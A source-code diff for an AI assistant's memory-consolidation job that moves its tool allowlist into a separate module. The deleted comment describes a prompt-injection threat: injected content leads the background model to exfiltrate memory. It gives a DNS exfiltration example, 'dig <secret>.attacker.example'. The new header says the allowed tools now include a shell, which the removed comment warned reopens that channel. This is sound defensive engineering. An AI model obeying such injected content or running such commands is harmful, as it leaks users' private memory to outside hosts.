@@ -16,9 +16,9 @@
  * assistant's voice are the point — there is no "consolidator persona" to
  * substitute in.
  *
- * The tool surface is wire-scoped to {@link CONSOLIDATION_ALLOWED_TOOLS} — the
- * local memory-file operations this pass needs. See that constant for why the
- * run must not carry network egress or host-proxy tools.
+ * The tool surface is wire-scoped to {@link CONSOLIDATION_ALLOWED_TOOLS}: local
+ * file tools, a shell for corpus-wide inspection, recall, and the page-delete
+ * primitive. See that constant for the surface and what it excludes.
  *
  * Lifecycle:
  *   1. Bail if memory is disabled or concept-page memory is not active
@@ -107,6 +107,7 @@ import {
   releaseLock,
   tryAcquireLock,
 } from "./consolidation-lock.js";
+import { CONSOLIDATION_ALLOWED_TOOLS } from "./consolidation-tool-surface.js";
 import { getPageIndex, type PageParseFailure } from "./page-index.js";
 import type { DanglingLink } from "./page-links.js";
 import {
@@ -119,47 +120,6 @@ const log = getLogger("memory-v2-consolidate");
 
 /** Stable identifier surfaced in `runBackgroundJob` logs and notifications. */
 const JOB_NAME = "memory.consolidate";
-
-/**
- * Tool surface the consolidation run is wire-scoped to. Consolidation is a
- * purely LOCAL memory-file reorganization pass: it reads `buffer.md` + existing
- * pages, writes/edits concept pages, rewrites recent/essentials/threads, and
- * trims the buffer. It has NO legitimate need for network egress or host-proxy
- * tools.
- *
- * Scoping is load-bearing because the run is guardian-trust + non-interactive:
- * the permission checker auto-approves any tool whose classified risk is within
- * the background threshold (default `low`), and a public `web_fetch` classifies
- * Low. An unrestricted surface would therefore let prompt injection embedded in
- * buffer/page content — which can originate from untrusted material the
- * assistant ingested (fetched web pages, emails, documents, channel messages) —
- * exfiltrate memory over an auto-approved egress channel. Wire-gating to this
- * allowlist removes that channel entirely: the excluded tools (`web_fetch`,
- * `web_search`, `network_request`, `host_*`, …) are never even presented to
- * the model, so the fix does not rely on the permission threshold. Mirrors the
- * hardening the sibling memory-retrospective job already applies.
- *
- * `bash` is deliberately EXCLUDED. A shell reopens the egress channel this
- * allowlist exists to close: `dig` / `nslookup` / `ping` classify Low in the
- * command registry and so auto-approve in this background context, letting
- * prompt-injected page content exfiltrate memory over DNS (`dig
- * <secret>.attacker.example`) even with `web_fetch` hidden. The one
- * page-maintenance operation a shell would otherwise handle — retiring a
- * merged/renamed/dead page — is served by `delete_memory_page`, a slug-scoped
- * memory-page delete that reaches only `memory/concepts/**` and carries no
- * network or arbitrary-path reach. It is an allowlist-only tool (hidden from
- * every other tool surface; see `ALLOWLIST_ONLY_TOOL_NAMES`), so naming it here
- * is what surfaces it.
- */
-const CONSOLIDATION_ALLOWED_TOOLS: readonly string[] = [
-  "file_read",
-  "file_write",
-  "file_edit",
-  "file_list",
-  "code_search",
-  "delete_memory_page",
-  "recall",
-];
 
 /**
  * Durable checkpoint tracking consecutive consolidation run failures.
